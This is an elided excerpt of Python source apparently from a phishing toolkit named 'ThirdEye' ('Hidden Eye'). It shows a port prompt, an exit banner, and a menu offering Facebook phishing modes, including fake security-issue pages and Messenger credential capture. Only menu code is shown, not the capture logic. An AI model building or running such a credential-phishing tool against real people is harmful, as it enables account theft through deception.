...
def selectPort():  # Question where user must select port
    ...
    choice = input(" \n{0}ThirdEye >>> {2}".format(MAIN0, MAIN4, MAIN2))
    try:
...
________________________________________________________________________________'''.format(MAIN3, MAIN4, MAIN2, MAIN0, version))
    ...
    option = input("\n{0}ThirdEye >>>  {1}".format(MAIN0, MAIN2))
    if option == '1' or option == '01':
        loadModule('Facebook')
        customOption = input("\nOperation mode:\n {0}[{1}1{0}]{1} Standard Page Phishing\n {0}[{1}2{0}]{1} Advanced Phishing-Poll Ranking Method(Poll_mode/login_with)\n {0}[{1}3{0}]{1} Facebook Phishing- Fake Security issue(security_mode) \n {0}[{1}4{0}]{1} Facebook Phising-Messenger Credentials(messenger_mode) \n{0}ThirdEye >>> {2}".format(MAIN0, MAIN2, MAIN2))
...
def endMessage(port):  # Message when ThirdEye exit
    ...
    if choice == 'R' or choice == 'r':
        ...
        system('clear')
        print('''
                  {3}HIDDEN EYE {3}BY: AIVATECH TEAM
            {1}https://github.com/AIVATECHDevelopers/ThirdEye
